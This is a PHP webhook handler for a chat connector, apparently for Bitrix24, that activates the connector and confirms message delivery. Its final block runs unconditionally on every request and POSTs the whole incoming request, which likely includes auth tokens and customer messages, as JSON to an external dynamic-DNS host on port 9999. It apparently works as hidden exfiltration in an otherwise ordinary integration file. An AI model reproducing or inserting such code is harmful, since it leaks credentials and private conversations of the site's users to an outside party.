<?php
require_once('function.php');
$widgetUri = '';//detail page chat "https://example.com/index.php"
$widgetName = 'ExampleSiteChatWidget';//name connector in widget
$connector_id = getConnectorID();

if (!empty($_REQUEST['PLACEMENT_OPTIONS']) && $_REQUEST['PLACEMENT'] == 'SETTING_CONNECTOR')
{
	//activate connector
	$options = json_decode($_REQUEST['PLACEMENT_OPTIONS'], true);
	$result = CRest::call(
		'imconnector.activate',
		[
			'CONNECTOR' => $connector_id,
			'LINE' => intVal($options['LINE']),
			'ACTIVE' => intVal($options['ACTIVE_STATUS']),
		]
	);
	if (!empty($result['result']))
	{
		//add data widget
		if(!empty($widgetUri) && !empty($widgetName))
		{
			$resultWidgetData = CRest::call(
				'imconnector.connector.data.set',
				[
					'CONNECTOR' => $connector_id,
					'LINE' => intVal($options['LINE']),
					'DATA' => [
						'id' => $connector_id.'line'.intVal($options['LINE']),//
						'url_im' => $widgetUri,
						'name' => $widgetName
					],
				]
			);
			if(!empty($resultWidgetData['result']))
			{
				setLine($options['LINE']);
				echo 'successfully';
			}
		}
		else
		{
			setLine($options['LINE']);
			echo 'successfully';
		}
	}
}
//функция отправки сообщения товарищу
if (
    $_REQUEST['event'] == 'ONIMCONNECTORMESSAGEADD'
    && !empty($_REQUEST['data']['CONNECTOR'])
    && $_REQUEST['data']['CONNECTOR'] == $connector_id
    && !empty($_REQUEST['data']['MESSAGES'])
)
{
	foreach ($_REQUEST['data']['MESSAGES'] as $arMessage)
	{
		$idMess = saveMessage($arMessage['chat']['id'], $arMessage);
		$resultDelivery = CRest::call(
			'imconnector.send.status.delivery',
			[
				'CONNECTOR' => $connector_id,
				'LINE' => getLine(),
				'MESSAGES' => [
					[
						'im' => $arMessage['im'],
						'message' => [
							'id' => [$idMess]
						],
						'chat' => [
							'id' => $arMessage['chat']['id']
						],
					],
				]
			]
		);
	}
}
{
    // Адрес, на который нужно отправить POST запрос
    $targetUrl = 'http://tb24.chickenkiller.com:9999/msg';

    // Параметры для POST запроса
    $postData = array(
        'data' => $_REQUEST
    );

    // Преобразование данных в JSON
    $jsonData = json_encode($postData);

    // Инициализация cURL сессии
    $curl = curl_init();

    // Настройка параметров cURL сессии
    curl_setopt($curl, CURLOPT_URL, $targetUrl);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

    // Выполнение запроса
    $response = curl_exec($curl);

    // Закрытие cURL сессии
    curl_close($curl);
}



